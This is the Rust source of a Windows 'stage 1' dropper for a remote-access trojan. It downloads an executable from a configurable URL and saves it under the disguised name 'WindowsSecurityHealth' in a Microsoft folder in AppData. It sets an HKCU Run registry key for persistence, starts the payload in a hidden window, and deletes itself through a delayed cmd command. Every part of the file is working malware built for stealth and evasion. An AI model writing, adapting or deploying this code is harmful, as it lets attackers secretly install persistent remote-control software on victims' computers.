// language: Rust, file: src/bin/dropper.rs, target: Windows
// Stage 1 loader. Downloads the agent, installs it under a Windows-looking name in
// %APPDATA%\Microsoft\Windows, registers an HKCU Run entry, launches it hidden, and
// deletes itself. Release build is windowless; progress goes to %TEMP%\rat_drop.log.
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use std::os::windows::process::CommandExt;
use std::path::PathBuf;

/// Where the agent is fetched from. Override with argv[1] or the RAT_URL env var.
const DEFAULT_URL: &str = "http://127.0.0.1:8000/stoat-rat.exe";
/// Windows-looking payload name (file + Run value).
const PAYLOAD_NAME: &str = "WindowsSecurityHealth";

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

#[tokio::main]
async fn main() {
    if let Err(e) = run().await {
        log(&format!("error: {e:#}"));
    }
}

async fn run() -> anyhow::Result<()> {
    let source = std::env::args()
        .nth(1)
        .or_else(|| std::env::var("RAT_URL").ok())
        .unwrap_or_else(|| DEFAULT_URL.to_string());
    let name = std::env::var("RAT_NAME").unwrap_or_else(|_| PAYLOAD_NAME.to_string());
    let dir = std::env::var("RAT_DESTDIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| {
            PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
                .join("Microsoft")
                .join("Windows")
        });
    log(&format!(
        "drop start source={source} name={name} dir={}",
        dir.display()
    ));

    // Fetch: HTTP(S) download, or a local path for offline testing.
    let bytes = if source.starts_with("http") {
        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .timeout(std::time::Duration::from_secs(180))
            .build()?;
        let body = client
            .get(&source)
            .send()
            .await?
            .error_for_status()?
            .bytes()
            .await?;
        body.to_vec()
    } else {
        std::fs::read(&source)?
    };
    if bytes.len() < 1024 || bytes.get(..2) != Some(b"MZ") {
        anyhow::bail!("payload is not a PE ({} bytes)", bytes.len());
    }
    log(&format!("payload {} bytes", bytes.len()));

    std::fs::create_dir_all(&dir).ok();
    let dest = dir.join(format!("{name}.exe"));
    let tmp = dir.join(format!("{name}.tmp"));
    std::fs::write(&tmp, &bytes)?;
    std::fs::rename(&tmp, &dest)?;
    log(&format!("installed -> {}", dest.display()));

    // Persistence: HKCU Run.
    {
        use winreg::enums::HKEY_CURRENT_USER;
        use winreg::RegKey;
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
        key.set_value(&name, &dest.to_string_lossy().to_string())?;
    }
    log("run key set");

    // Launch the agent hidden; tell it to keep persistence asserted.
    if std::env::var_os("RAT_NOEXEC").is_none() {
        std::process::Command::new(&dest)
            .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
            .env("RAT_PERSIST", "1")
            .env("RAT_NAME", &name)
            .spawn()?;
        log("payload launched");
    } else {
        log("RAT_NOEXEC set; payload not launched");
    }

    // Self-delete: a detached cmd waits for this process to exit, then removes it.
    if std::env::var_os("RAT_NODELETE").is_none() {
        if let Ok(selfp) = std::env::current_exe() {
            let cmd = format!(
                "/C timeout /t 2 /nobreak >nul & del /f /q \"{}\"",
                selfp.display()
            );
            let _ = std::process::Command::new("cmd")
                .arg(cmd)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn();
            log("self-delete scheduled");
        }
    }
    Ok(())
}

fn log(msg: &str) {
    use std::io::Write;
    let p = std::env::temp_dir().join("rat_drop.log");
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(p) {
        let _ = writeln!(f, "{msg}");
    }
}
